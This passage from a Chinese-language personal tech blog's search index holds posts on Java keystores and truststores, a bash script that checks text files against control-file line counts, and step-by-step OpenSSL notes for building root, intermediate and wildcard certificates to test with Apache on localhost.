搜尋](https://www.google.com/search?q=SendEnv++jenkins+ssh+%E4%BA%82%E7%A2%BC&client=firefox-b-d&sxsrf=ALeKk02NHeZqOFBICu1lc9oM33eKuEKtLg:1595612479397&ei=Px0bX_vfF4eTr7wPhZq5gAI&start=10&sa=N&ved=2ahUKEwi7-6HYt-bqAhWHyYsBHQVNDiAQ8NMDegQIDBBD&biw=1280&bih=620)\n* [jenkins 节点主机在不同系统导致乱码的解决办法 - 花花兽的个人页面 - OSCHINA](https://my.oschina.net/sunlimiter/blog/877025)\n* [Jenkins on Windows 心得分享 (03)：有效避免記錄檔或訊息出現亂碼的方法 | The Will Will Web](https://blog.miniasp.com/post/2015/12/24/Jenkins-on-Windows-03-Avoid-messy-words-in-log-messages)\n* [Jenkins之解决乱码问题_ZZY1078689276的专栏-CSDN博客_jenkins utf-8 文件乱码](https://blog.csdn.net/ZZY1078689276/article/details/77839045)\n* [【转】ssh 中文乱码问题_安科网](https://www.ancii.com/asceau5ym/)\n","tags":["java"],"categories":["Linux"]},{"title":"keystore 小記","url":"%2Fblog%2F2020%2F07%2F28%2Fkeystore-%E5%B0%8F%E8%A8%98%2F","content":"\n最近研究憑證，知道 Java 管理憑證機制是用自己的\nkeystore 這個是 Java 用的憑證\n本篇不實作，簡單整理網路上的資訊\n\n<!--more-->\n\n## 什麼是 keystore\n\n> Keytool是Java證書的管理工具，Keytool將金鑰（key）、證書（certificates）存在一個keystore的檔案裡\n\n[利用keystore 指令來確認憑證密碼 - 可丁丹尼 @ 一路往前走2.0](https://cms.35g.tw/coding/keystore-check-password/)\n\n## jssecacerts\n\n>JSSE簡介\n>\n>Java安全套接擴展 (Java Secure Socket Extension, JSSE)是實現Internet安全通信的一系列包的集合。它是一個>SSL和TLS的純Java實現，可以透明地提供數據加密、服務器認證、信息完整性等功能，可以使我們像使用普通的套接字一樣使>用JSSE建立的安全套接字。JSSE是一個開放的標準，不只是Sun公司才能實現一個JSSE，事實上其他公司有自己實現的JSSE。\n>\n>在深入瞭解JSSE之前，需要瞭解一個有關Java安全的概念：客戶端TrustStore文件。客戶端的TrustStore文件中保存著被客戶端所信任的服務器證書信息，客戶端在嘗試進行SSL連接時，JSSE將根據這個文件中的證書是否決定信任服務端的證書。\n>\n>JSSE中有一個信任管理器負責決定是否信任遠程服務器的證書，該類有如下處理原則：\n>\n>    如果該系統屬性javax.net.sll.trustStore指定了TrustStore文件，那麼信任管理器就去jre安裝路徑下的lib/security/目錄中尋找並使用這個文件來檢查證書。如果該系統沒有指定TrustStore文件，它就會去jre安裝路徑下尋找默認的TrustStore文件，這個文件的相對路徑為：lib/security/jssecacerts。如果jssecacerts不存在，但是cacerts存在(它隨J2SDK一起發行，含有數量有限的可信任的基本證書)，那麼這個默認的TrustStore文件就是cacerts。Java提供了一種非常簡潔的方法來訪問HTTPS網頁，即使用類HttpsURLConnection、URL等。這些類為支持HTTPS對JSSE相關類做了一些封裝。 \n\n[用Java實現HTTPS工作原理（二） - 知乎](https://zhuanlan.zhihu.com/p/75456673)\n\n最近專案看到 jssecacerts\n從這個上面我猜測是管理根憑證東西\nJava 預設是沒有加入根憑證的，所以沒辦法使用。\n\n要怎麼測試憑證 Java 吃的到?\n[Java 因憑證 SNI 問題驗證不過 | 程式狂想筆記](https://malagege.github.io/blog/2020/06/25/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/)\n這篇有講到檢查憑證方法\n可以指定根憑證檢查檔案\n```bash\njava -Djavax.net.ssl.trustStore=/path.../jssecacerts  -jar java-keystore-test-0.1.0.jar  https://xxx.twca.domain\n```\n\n檢查也有找到這個方法可用[[JAVA] SSL handshake連線測試工具 SSLPoke | 阿輝的零碎筆記 - 點部落](https://dotblogs.com.tw/grayyin/2018/07/12/145718)\n\nSSLPoke.java\n```java\nimport java.io.PrintStream;\nimport javax.net.ssl.SSLHandshakeException;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class SSLPoke\n{\n  public SSLPoke() {}\n  \n  public static void main(String[] paramArrayOfString)\n  {\n    if (paramArrayOfString.length != 2) {\n      System.err.println(\"Utility to debug Java connections to SSL servers\");\n      System.err.println(\"Usage: \");\n      System.err.println(\"  java \" + SSLPoke.class.getName() + \" <host> <port>\");\n      System.err.println(\"or for more debugging:\");\n      System.err.println(\"  java -Djavax.net.debug=ssl \" + SSLPoke.class.getName() + \" <host> <port>\");\n      System.err.println();\n      System.err.println(\"Eg. to test the SSL certificate at https://localhost, use\");\n      System.err.println(\"  java \" + SSLPoke.class.getName() + \" localhost 443\");\n      System.exit(1);\n    }\n    try {\n      SSLSocketFactory localSSLSocketFactory = (SSLSocketFactory)SSLSocketFactory.getDefault();\n      SSLSocket localSSLSocket = (SSLSocket)localSSLSocketFactory.createSocket(paramArrayOfString[0], Integer.parseInt(paramArrayOfString[1]));\n      \n      java.io.InputStream localInputStream = localSSLSocket.getInputStream();\n      java.io.OutputStream localOutputStream = localSSLSocket.getOutputStream();\n      \n\n      localOutputStream.write(1);\n      \n      while (localInputStream.available() > 0) {\n        System.out.print(localInputStream.read());\n      }\n      System.out.println(\"Successfully connected\");\n      System.exit(0);\n    }\n    catch (SSLHandshakeException localSSLHandshakeException) {\n      if (localSSLHandshakeException.getCause() != null) {\n        localSSLHandshakeException.getCause().printStackTrace();\n      } else {\n        localSSLHandshakeException.printStackTrace();\n      }\n    } catch (Exception localException) {\n      localException.printStackTrace();\n    }\n    System.exit(1);\n  }\n}\n```\n\n\n```\n## 先打包成class\n$ javac SSLPoke.java\n$ java SSLPoke www.google.com 443\n```\n連線成功會顯示\n```\n$ java SSLPoke www.google.com 443\nSuccessfully connected\n```\n失敗就會出現一大堆錯\n\n看根憑證\n\n```\n# 查詢keystore的內容\n      keytool –list –v –keystore .keystore\n```\n[Java keytool 基本指令 | 阿輝的零碎筆記 - 點部落](https://dotblogs.com.tw/grayyin/2019/05/04/143637)\n\n加入 TWCA 根憑證\n\n```bash\nkeytool -importcert -file \"twca root ca.cer\"  -keystore jssecacerts\n```\njssecacerts 是放憑證\nJava 存放憑證路徑\n\nC:\\Program Files\\Java\\jdk-13.0.2\\lib\\security\n\nLinux 待補(有想到的話)，其實也是放在相似地方\n\n\n本篇到這邊\n\n查詢整理\n* [Java keytool 基本指令 | 阿輝的零碎筆記 - 點部落](https://dotblogs.com.tw/grayyin/2019/05/04/143637)\n* [我的工作日記: Java Keytool的使用及申請憑證(以Microsoft Active Directory Certificate Services為例)](http://polinwei.blogspot.com/2013/02/java-keytoolmicrosoft-active-directory.html)\n* [Java Keytool使用方式 - SSL憑證推薦網 | SSL憑證 | code Sign](https://sslbuyer.com/index.php?option=com_content&view=article&id=134:keytool-usage&catid=25&Itemid=4031)\n* [使用自签名证书，简单步骤 - 凝雨 - Yun](https://ningyu1.github.io/site/post/52-ssl-cert-2/)\n* [利用keytool 匯入CA Root 憑證方式 - 寰宇數位認證中心 - 技術支援 Support](https://www.ssl.com.tw/Support/title_show.asp?id1=7&id2=1,0&titleid=249)\n* [ssl - java - path to trustStore - set property doesn't work? - Stack Overflow](https://stackoverflow.com/questions/2138574/java-path-to-truststore-set-property-doesnt-work)\n* [[JAVA] SSL handshake連線測試工具 SSLPoke | 阿輝的零碎筆記 - 點部落](https://dotblogs.com.tw/grayyin/2018/07/12/145718)\n* [Use SSL Poke to test Java SSL connection - matthewdavis111](https://matthewdavis111.com/java/poke-ssl-test-java-certs/)\n* [Connecting to SSL services - Atlassian Documentation](https://confluence.atlassian.com/jira/connecting-to-ssl-services-117455.html)\n\n\n\n* [Android Studio：Keystore 建立與管理. 撰文時使用 MAC + Android Studio 2.2RC | by Kent Chen | Medium](https://medium.com/@kentchen_tw/android-studio-keystore-%E5%BB%BA%E7%AB%8B%E8%88%87%E7%AE%A1%E7%90%86-47d4afcc6e61)\n* [关于keystore的简单介绍_人在旅途-CSDN博客_keystore是什么](https://blog.csdn.net/dotuian/article/details/51722300)\n* [Android Keystore漫谈 - 简书](https://www.jianshu.com/p/644ddb6e3d9c)\n* [crt to keystore - Google 搜尋](https://www.google.com/search?q=crt+to+keystore&client=firefox-b-d&sxsrf=ALeKk015rMyv_7BJR7XF7bp-HrBvx85Ybg:1595943967876&ei=HywgX8uLNfnUmAXO4yA&start=20&sa=N&ved=2ahUKEwiLl6XKivDqAhV5KqYKHc4xCAA4ChDw0wN6BAgMEEM&biw=1280&bih=644)\n* [CRT证书转JKS证书 - 簡書](https://www.jianshu.com/p/59e2bb2befa9)\n* [Keystore更新重置. 相信可能有人有遺失Keystroe的經驗，因這次筆者拿金鑰去註冊測試Fireba… | by 陳建維 Ben | 工程師求生指南(Sofware Engineer Survival Guide) | Medium](https://medium.com/%E5%B7%A5%E7%A8%8B%E5%B8%AB%E6%B1%82%E7%94%9F%E6%8C%87%E5%8D%97-sofware-engineer-survival-guide/%E5%9C%96%E8%A7%A3keystore%E6%9B%B4%E6%96%B0%E6%95%91%E6%8F%B4-55f230db4914)\n* [DH技術筆記: SSL憑證建立](http://dh66.blogspot.com/2013/07/ssl.html)","tags":["java"],"categories":["Linux"]},{"title":"Shell 檢查 txt 和 總數確認檔方法","url":"%2Fblog%2F2020%2F07%2F19%2FShell-%E6%AA%A2%E6%9F%A5-txt-%E5%92%8C-%E7%B8%BD%E6%95%B8%E7%A2%BA%E8%AA%8D%E6%AA%94%E6%96%B9%E6%B3%95%2F","content":"\n最近要人工分開 txt檔案\n因為確認檔案花很多眼力去做調整\n偶爾會有改錯情形\n為了不發生這個原因\n我做個簡單調整\n\n<!--more-->\n\n\n```bash\n#!/bin/bash\n\nFILE_LIST=(`ls *.txt *.ctl`)\n\n# echo ${#FILE_LIST[@]};\n\nfor i in ${!FILE_LIST[@]}; do\n\tFILE_LIST[$i]=\"${FILE_LIST[$i]%.*}\"\ndone\n\n# echo \"${FILE_LIST[@]}\" | tr ' ' '\\n' | sort -u\nFILE_LIST=($(echo \"${FILE_LIST[@]}\" | tr ' ' '\\n' | sort -u ))\n# echo ${#FILE_LIST[@]};\nfor i in ${!FILE_LIST[@]}; do\n\tif [ -f ${FILE_LIST[$i]}.txt ]; then\n\t    # 檔案 /path/to/dir/filename 存在\n\t    echo \"File ${FILE_LIST[$i]}.txt exists.\"\n\telse\n\t    # 檔案 /path/to/dir/filename 不存在\n\t    echo \"File ${FILE_LIST[$i]}.txt does not exists.\"\n\t    continue;\n\tfi\n\n\tif [ -f ${FILE_LIST[$i]}.ctl ]; then\n\t    # 檔案 /path/to/dir/filename 存在\n\t    echo \"File ${FILE_LIST[$i]}.ctl exists.\"\n\telse\n\t    # 檔案 /path/to/dir/filename 不存在\n\t    echo \"File ${FILE_LIST[$i]}.ctl does not exists.\"\n\t    continue;\n\tfi\n\n\tFIRST_LINE=$(head -n 1 ${FILE_LIST[$i]}.ctl)\n\n\tLINE_COUNT=$(cat ${FILE_LIST[$i]}.txt | wc -l)\n\t#https://unix.stackexchange.com/questions/232384/argument-string-to-integer-in-bash/232386\n\techo \"TXT:    $((LINE_COUNT+1))\"\n\techo \"CTL:    $FIRST_LINE\" ;\n\n\tif [ \"$FIRST_LINE\" = $((LINE_COUNT+1)) ]; then\n\t\techo \"${FILE_LIST[$i]} 正確\"\n\telse\n\t\techo \"${FILE_LIST[$i]} 不正確!!!!!!!!!!!!!!!!!!\"\n\tfi\n\n\ndone\n#https://stackoverflow.com/questions/13648410/how-can-i-get-unique-values-from-an-array-in-bash\n\n# \n# line=$(head -n 1 filename)\n\n# https://stackoverflow.com/questions/3137094/how-to-count-lines-in-a-document\n# cat /dir/file.txt | wc -l\n```","tags":["shell"],"categories":["Linux"]},{"title":"產生自簽憑證筆記","url":"%2Fblog%2F2020%2F07%2F18%2F%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98%2F","content":"\n上次上班花很多時間處理憑證問題\n為了碰到下次不要花費太多時間[設備根憑證不正確導致不能打API問題 | 程式狂想筆記](https://malagege.github.io/blog/2020/07/14/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/)\n今天要還債(技術債)了\n主要試試看建立憑證\n\n<!--more-->\n\n\n## 建立根憑證\n\n這邊範例是照[如何使用 OpenSSL 建立開發測試用途的自簽憑證 (Self-Signed Certificate) | The Will Will Web](https://blog.miniasp.com/post/2019/02/25/Creating-Self-signed-Certificate-using-OpenSSL?fbclid=IwAR3xS1xqkOfLQmK22bDyp9bgOJ71PBNChr-2REMq3oIMT5-0biUTJl41a1k)\n可以找個 VM 來測試看環境\n\n1. 安裝 openssl\n\nubuntu 預設就會安裝\n\n2. 設定 conf \n\n```conf\n[req]\nprompt = no\ndefault_md = sha256\ndefault_bits = 2048\ndistinguished_name = dn\nx509_extensions = v3_req\n\n[dn]\nC = TW\nST = Taiwan\nL = Taipei\nO = Duotify Inc.\nOU = IT Department\nemailAddress = admin@example.com\nCN = localhost\n\n[v3_req]\nsubjectAltName = @alt_names\n\n[alt_names]\nDNS.1 = *.localhost\nDNS.2 = localhost\nIP.1 = 192.168.2.100\n```\n\n3. 產生私鑰、公鑰\n\n```bash\nopenssl req -x509 -new -nodes -sha256 -utf8 -days 3650 -newkey rsa:2048 -keyout server.key -out server.crt -config ssl.conf\n```\n\n4. 丟到系統憑證區\n\nUbuntu \n\n```bash\nsudo cp server.crt /usr/local/share/ca-certificates/\nsudo update-ca-certificates\n```\n\n5. 測試結果\n沒錯，就這麼簡單\n可以找一個隨便 Web Server 建立\n\n這邊我用的是 Apache 安裝\n這邊小卡了一下，因為我是第一次設定XD\n\n啟用 ssl 模組\na2enmod ssl\n啟用 ssl 虛擬站台\na2ensite default-ssl\n重啟 apache\nsudo service apache2 restart\n修改憑證路徑(private.key,public.crt/pem)\nvim /etc/apache2/sites-enabled/default-ssl.conf \n\n```\nSSLCertificateFile      /home/vagrant/server.crt\nSSLCertificateKeyFile /home/vagrant/server.key\n```\n\n就可以測試結果了\n\n```bash\ncurl https://localhost\n# ok\necho \"\"|openssl s_client  -connect localhost:443 2>&1  | less\n# 會有Can't use SSL_get_servername\n# 不過還是過了，verify return:1 \necho \"\"|openssl s_client -servername localhost -connect localhost:443 2>&1  | less\n# 就不會有這個問題 Can't use SSL_get_servername\n```\n\n相關教學\n\n[OpenSSL 簽發憑證方式 [蔡宗融個人網站]](https://www.ichiayi.com/wiki/tech/openssl_caserver)\n使用這個做，會有`[Sat Jul 18 11:12:43.084807 2020] [ssl:emerg] [pid 27557:tid 140210043268160] SSL Library Error: error:140AB18E:SSL routines:SSL_CTX_use_certificate:ca md too weak\nAH00016: Configuration Failed`\n後來參考:[Raspberry Pi 的實作 - 產生一張自己核發的 SSL 憑證 | IT 技術家](http://blog.itist.tw/2014/06/openssl.html)\n使用1024會有ee key too small\n[nginx:SSL: error:140AB18F:SSL routines:SSL_CTX_use_certificate:ee key too small - 八戒vs - 博客园](https://www.cnblogs.com/stronger-xsw/p/12760904.html)\n改成 2048 就可以\n\n原本我根憑證想簽下面憑證，產生出來設定在Apache\n竟然都失敗了\n這時候我突然想到，每一張都可以簽，不就沒有管理機制?\n\n> 其他欄位比較重要的是basic constraints的CA:true和key usage的key cert sign，表示這個憑證可以再往下簽（總不可能讓它無限簽吧）。\n參考來源:[TU的雜七雜八筆記本: OpenSSL Certificate Chain (included SAN)](http://qbsuranalang.blogspot.com/2017/05/openssl-certificate-chain-included-san.html)\n\n[HAProxy 整合 SSL/TLS Client Certificate 教學 - Soul & Shell Blog](https://blog.toright.com/posts/4024/haproxy-%E6%95%B4%E5%90%88-ssltls-client-certificate-%E6%95%99%E5%AD%B8.html)\n這邊沒有提到CA:true\n\n回頭看我產出來的\n```bash\nopenssl x509 -noout -text -in server.crt\n```\n真的沒有CA:true\n\n我 Google 到這篇[如何使用 OpenSSL 簽發中介 CA](https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/)\n照他的產生 Root CA 步驟結果有看到 CA:true\n估計是保哥使用`x509_extensions = v3_req`關係\n所以沒有開到 CA:true\n\n## 產生中繼憑證\n\n### 產生授權根憑證\n\n[如何使用 OpenSSL 簽發中介 CA](https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/){% asset_link web2.png 備份圖 %}\n\n> 建立 Key 應該是整個環節中最簡單的步驟了，利用簡單的 openssl genrsa 即可，這邊採用 AES256 加密 Key 並將長度設為 4096（如果你不想要加上密碼，就不要下 -aes256，但你的 Key 就少了一層保護）：\n\n我不想打密碼就拿掉了\n\n```\nopenssl genrsa  -out ca.key 4096\n```\n\n相關資訊打完(備註: CN 我打 localhost) \n複製到系統安全憑證區\n\n```bash\nsudo cp ca.pem /usr/local/share/ca-certificates/ca.srt  # 這邊要改成srt\nsudo update-ca-certificates\n```\n\nopenssl x509 -noout -text -in ca.pem\n確實有看到 CA: true\n先到 Apache 測試 https://localhost\ncurl 成功\n\n### 產生中繼憑證\n\n```bash\nopenssl genrsa  -out intermediate.key 4096\n```\n一樣我AES256拿掉\n~~我就是不想打密碼，我就爛XD~~\n\n```bash\n#CN 我設定 a.localhost 網域\nopenssl req -sha256 -new -key intermediate.key -out intermediate.csr\nvim intermediate.ext\n```\nintermediate.ext內容貼上去\n```intermediate.ext\n[ intermediate_ca ]\nsubjectKeyIdentifier = hash\nauthorityKeyIdentifier = keyid:always,issuer\nbasicConstraints = CA:true, pathlen:0\n```\n\n> 為什麼要自己定義呢？ 用原本的 v3_ca 不好嗎？\n> 當然，如果你想要讓這個 CA 跟 Root CA 一樣可以繼續往下簽 Intermediate CA 的話，那你可以選擇繼續使用 v3_ca。\n> 上面定義的 intermediate_ca 相較預設的 v3_ca 多了一個 pathlen:0，表示他往下還可以有 0 個 Intermediate CA（也就是沒有的意思）。\n\n```\nopenssl x509 -req -in intermediate.csr \\\n               -CA ca.pem -CAkey ca.key \\\n               -CAserial ca.serial -CAcreateserial \\\n               -days 730 \\\n               -extensions intermediate_ca -extfile intermediate.ext \\\n               -out intermediate.pem\n```\n\n> 其中有幾個選項需要介紹一下：\n>\n>    -CAserial ca.serial： 每個 CA 簽發憑證時都需要一個流水號，這裡是指出流水號記錄檔檔名\n>    **-CAcreateserial： 只有當 CA 初次簽發時需要，他會初始化一個流水號出來，第二次之後簽發就不要帶這個參數，以免流水號被重置**\n>    -extensions intermediate_ca： 我們想要指定剛剛我們建立的 extension\n>    -extfile intermediate.ext： 需要指定包含 extension 的設定檔\n\n```bash\n# 查看中繼憑證\nopenssl x509 -noout -text -in intermediate.pem \n```\n\n> 可以看到 Issuer 是我們 Root CA 的名稱，而 Subject 是 CSR 中填寫的內容。\n> 並且有將 pathlen 設為 0，表示這個 CA 只能用來簽發終端憑證。\n\n> 另外，我們還可以透過 openssl verify 驗證這個憑證是不是由 Root CA 一路發下來的。\n\n```bash\nopenssl verify -CAfile ca.pem intermediate.pem\n# intermediate.pem: OK\n```\n\n一樣我把中繼憑證複製到 Apache 測試 https://a.localhost OK(更換憑證設定我就不寫了)\n\n\n### 產生終端憑證\n\n```bash\n# -aes256 拿掉，不解釋\nopenssl genrsa  -out endentity.key 4096\n# 這次我 CN = a.a.localhost\nopenssl req -sha256 -new -key endentity.key -out endentity.csr\n# 中繼憑證簽發終端憑證\nopenssl x509 -req -in endentity.csr \\\n               -CA intermediate.pem -CAkey intermediate.key \\\n               -CAserial intermediate.serial -CAcreateserial \\\n               -days 365 \\\n               -out endentity.pem\n# 查看憑證\nopenssl x509 -noout -text -in endentity.pem\n# 檢查憑證鍊\nopenssl verify -CAfile ca.pem -untrusted intermediate.pem endentity.pem\n```\n\n這邊因為有 Apache/nginx 中繼憑證\n所以在設定上會不太一樣\nApache 有特別設定方法，這邊就不仔細說原因了\n\n```\nSSLCertificateFile      /home/vagrant/test/endentity.pem\nSSLCertificateKeyFile /home/vagrant/test/endentity.key\nSSLCertificateChainFile /home/vagrant/test/intermediate.pem\n```\n\nNginx/Apache 都可以把中繼憑證包在一起\n\n```bash\n# cat endentity.pem > web.crt\n# cat intermediate.pem >> web.crt\ncat endentity.pem intermediate.pem > web.crt\n```\nApache 設定\n```\nSSLCertificateFile      /home/vagrant/test/web.crt\nSSLCertificateKeyFile /home/vagrant/test/endentity.key\n#SSLCertificateChainFile /home/vagrant/test/intermediate.pem\n```\n\ncurl https://a.a.localhost/ 顯示正常\n\n## wildcard \n\n以下教學使用[使用 OpenSSL 製作萬用字元 SSL 憑證-黑暗執行緒](https://blog.darkthread.net/blog/issue-wildcard-ssl-cert-with-openssl/)\n\n> 2017 年 Chrome 58 / Firefox 48 開始要求憑證必須改用 SubjectAltName 欄位提供主機名稱 ，否則將顯示為不安全\n\n\n========= 犯錯區 Start =========\n\n**這邊修改 \\*.localhost,\\*.\\*.localhost,\\*.\\*.\\*.localhost 網域**\n\n這邊後續我有繼續做，一直失敗，差點要放棄\n過程是這樣的\n1. 我把localhost-ext.cnf 把 \\*.localhost 單獨一個\n結果失敗了\n2. 我把 SNA 只留 \\*.localhost\n還是失敗了\n3. 我把 SNA 放 \\*.localhost, localhost\n也是失敗了\n4. 我把 Apache conf 設定家 Servername localhost Serveralias localhost \\*.localhost\n還是失敗了\n\n5. ...\n[Generating and Installing Wildcard and Multi-Domain SSL Certificates | DeveloperSide.NET](https://www.devside.net/wamp-server/generating-and-installing-wildcard-and-multi-domain-ssl-certificates)\n\nopenssl verify -CAfile ca.pem -untrusted intermediate.pem localhost.crt\n這一段沒有錯，但還是跑出這個錯誤\ncurl -v https://a.a.localhost\n\n*  subjectAltName does not match a.a.localhost\n* SSL: no alternative certificate subject name matches target host name 'a.a.localhost'\n跟別的網站不一樣\n*  subjectAltName: host \"xxx.xxxxx.com.tw\" matched cert's \"\\*.xxxxx.com.tw\"\n\napache error log \nAH01909: 127.0.1.1:443:0 server certificate does NOT include an ID which matches the server name\n\n>  後來求助偉大的谷歌，發現原來是nginx的TLS SNI support功能沒開，SNI （服務器名字指示）不開啟的話，一個IP只支持一個SSL證書，不支持多個證書，而服務器是yum安裝的nginx，默認TLS SNI support是關閉的，重新編譯nginx並指定openssl庫後，TLS SNI support 開啟了，訪問就正常了\n[記錄一次升級https走過的坑-czwanga-51CTO博客](https://blog.51cto.com/czwanga/1925013)\n\n...\n....\n.....\n\n~~總之努力不一定會成功，不努力就一定很輕鬆~~\n~~各位 Bye~~\n剛好最近看到[【Fun科學】靈壓探測器(潛伏身邊的不明危機！) - YouTube](https://www.youtube.com/watch?v=AlOO2yb4q2M&feature=youtu.be&t=236)\n\n為了不浪費大家的時間，我最後解決了，整理一下發生了什麼原因\n\n~~這邊修改 \\*.localhost,\\*.\\*.localhost,\\*.\\*.\\*.localhost 網域~~\n這邊我犯了很嚴重錯誤\n這邊萬用網域也不是可以隨便用網址\n需要使用**一級網域**做萬用憑證 EX:\\*.localhost.com  <==== 這邊**一級網域**應該是指 萬用憑證 不是只 SNA\n萬用憑證也只能用一層，所以\\*.\\*.localhost.com,\\*.\\*.\\*.localhost.com (應該不行，我沒有實驗)\n正確來說 現在萬用憑證不看 CN 了，現在瀏覽器都會看 SNA 是否正確\nSNA 算是 憑證 x509 插件\n有實驗 \\*.a.localhost.com 是可以跑了\n\n因為 localhost.com 網域 DNS 會抓不到\n所以我們先手動設定 /etc/hosts 設定 127.0.0.1  localhost.com\n家如要新增 a.localhost.com 也要獨立新增 127.0.0.1 a.localhost.com\nSNA 也能設定 *.a.localhost.com ，沒有一級網域限制\n\n以上是我實驗結果\n\n參考資料\n* [OpenSSL SAN 证书 - Fantasy](http://liaoph.com/openssl-san/)\n這邊裡面有介紹 SNA\n\n> 萬用字元憑證只能覆蓋一級子域\n[萬用字元憑證 - 維基百科，自由的百科全書](https://zh.wikipedia.org/wiki/%E9%80%9A%E9%85%8D%E7%AC%A6%E8%AF%81%E4%B9%A6)\n\n\n>    Wildcard Domains: Wildcard domains such as *.example.com are useful when protecting multiple services on one domain such as www.example.com, mail.example.com, mx.example.com, ftp.example.com, blog.example.com, etc. however it has several limitations:\n>        Non-zero length subdomain: first is that many sites will use a combination of www.example.com and example.com and a *.example.com wildcard will not match the latter.\n>        Only flat subdomain support: wildcards will not support multiple subdomains, for example *.m.example.com will not be matched by *.example.com.\n>        Only one domain: finally, *.example.com will not support an entirely different subdomain such as foobar.com\n>    Subject Alternative Name: Using the X.509 subjectAltName extension has been useful to address some of the limiations of wildcard domains, namely they can contain multiple FQDNs of all types so names with differing numbers of subdomains and entirely different domains can be suppored. To make SANs even more useful, the goal of this effort was to validate the support for using wildcard domain names in the SAN.\n參考來源:[Wildcard Subject Alternate Name SSL/TLS Certificates](https://grokify.github.io/security/wildcard-subject-alternative-name-ssl-tls-certificates/)\n\n========= 犯錯區 End =========\n\n這邊拿剛剛上面中繼憑證繼續用\n\n```bash\n# 建立私鑰\nopenssl genrsa -out localhost.key 2048\n# 設定 localhost.cnf\nvim localhost.cnf\n```\n\nlocalhost.cnf\n```\n[req]\ndefault_bits = 2048\nprompt = no\ndefault_md = sha256\ndistinguished_name = dn\n\n[dn]\nC=TW\nST=Taiwan\nL=Taipei\nO=localhost\nOU=localhost CA\nemailAddress=nobody@localhost\nCN=*.localhost.com\n```\n\n\n```bash\n# 產出 CSR\nopenssl req -new -sha256 -nodes -key localhost.key -out localhost.csr -config localhost.cnf\n\nvim localhost-v3.cnf\n```\n\nlocalhost-v3.cnf\n```conf\nkeyUsage                = critical,digitalSignature,keyEncipherment\nextendedKeyUsage        = serverAuth,clientAuth\nsubjectKeyIdentifier    = hash\nbasicConstraints=CA:FALSE\nsubjectAltName = @alt_names\n\n[alt_names]\nDNS.1 = *.localhost.com\nDNS.2 = localhost.com\nDNS.3 = *.a.localhost.com\n```\n\n這邊因為中途失敗一直嘗試更改，所以跟darkthread-net-v3.ext 不太一樣\n\n> ```\n> authorityKeyIdentifier=keyid,issuer\n> basicConstraints=CA:FALSE\n> keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment\n> subjectAltName = @alt_names\n> \n> [alt_names]\n> DNS.1 = *.darkthread.net\n> ```\n\n\n```bash\n#  拿掉 -CAcreateserial\n#  -CAserial intermediate.serial 需要指定序號，後面參數指的是序號檔名\nopenssl x509 -req -in localhost.csr -CA intermediate.pem -CAkey intermediate.key  -out localhost.crt -days 365 -sha256 -CAserial intermediate.serial -extfile localhost-v3.ext\n```\n\n基本上放在 Apache 之前設定跟之前差不多\n我就不說了\n\nhttps://a.localhost.com\nhttps://a.a.localhost.com\n\ncurl 都可以順利跑\n\n\n\n## TWCA 憑證為什麼有三層，四層串到同一個憑證呢?\n\n我目前猜想其中兩邊憑證都是吃同一把私鑰\n產生兩組 crt(public key)\n所以憑證都可以用\n\n```bash\nopenssl x509 -req -in intermediate.csr \\\n               -CA ca.pem -CAkey ca.key \\\n               -CAserial ca.serial \\\n               -days 730 \\\n               -extensions intermediate_ca -extfile intermediate.ext \\\n               -out intermediate2.pem\n```\n\n**2020-07-22**\n最後這篇有和我同學討論\n![](https://malagege.github.io/blog/2020/07/14/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/cgh.png)\n我認為跟用同一個私金鑰產生有關係\n他認為公鑰解析出來應該跟 pin sha256 一樣有關係 (當時看圖片沒注意到)\n不過我們加密學都不是很懂，這邊就不繼續研究了\n\n至於抓兩個路徑\n我目前猜測四層憑證第二層對應上去都是 TWCA Global Root CA\n除了中繼憑證跟電腦跟憑證 Mapping 到名子對應上去剛好符合驗證解密內容\n四層憑證在 Windows 看是四層，但用在 Firefox,Linux(Chrome),Android(Chrome) 來看竟然是抓到三層\n\n\n總結心得\n當出現網站不安全，都是無法串連(client)**根憑證**有關係\n根憑證正確就往下追中繼憑證，中繼憑證順序都需要注意\n中繼憑證可以不用附根憑證(畢竟裝置有根憑證，沒必要再傳送過去)\n但我這個案例比較特別，正常應該不會遇到\n裝置有兩個 TWCA 根憑證，正常應該不會遇到問題\n就算裝置有三層根憑證，也通吃\n但是裝置只有四層根憑證，就會出現不安全!!!(像 LINE Webhook 就沒有 TWCA 三層憑證)\n不過還是看到滿多網站都掛四層憑證居多\n可以到很多銀行、醫院網站看看憑證\n\n\n把 apache 設定 endentity.pem 對應 intermediate2.pem 真得可以用\n\n## 測試檔案\n\n{% asset_link test_cert.7z 所有範例下載 %}\n\n/vagrant/ <====== 第一段建立憑證範例\n/vagrant/test/ <====== 第二、三段建立中繼、萬用憑證範例\n   hosts 參考 dns 設定檔\n   default-ssl.conf apache 設定檔\n\n## 查看 web 上驗憑證內容\n\n```bash\nopenssl s_client  -connect localhost.com:443 </dev/null  |  openssl x509 -noout -text  | less\n\nopenssl s_client  -connect youtube.com:443 </dev/null  |  openssl x509 -noout -text  | less\n```\n\n## 其他資源\n\n* [Java keytool 基本指令 | 阿輝的零碎筆記 - 點部落](https://dotblogs.com.tw/grayyin/2019/05/04/143637)\n\n* [[Server] TLS/SSL憑證(Certificate)常用指令 – 製作CSR – YIDAS Code](https://code.yidas.com/tls-ssl-certificate-guide/)\n\n* [[推薦] 快速產生本地端開發用SSL憑證工具-mkcert | 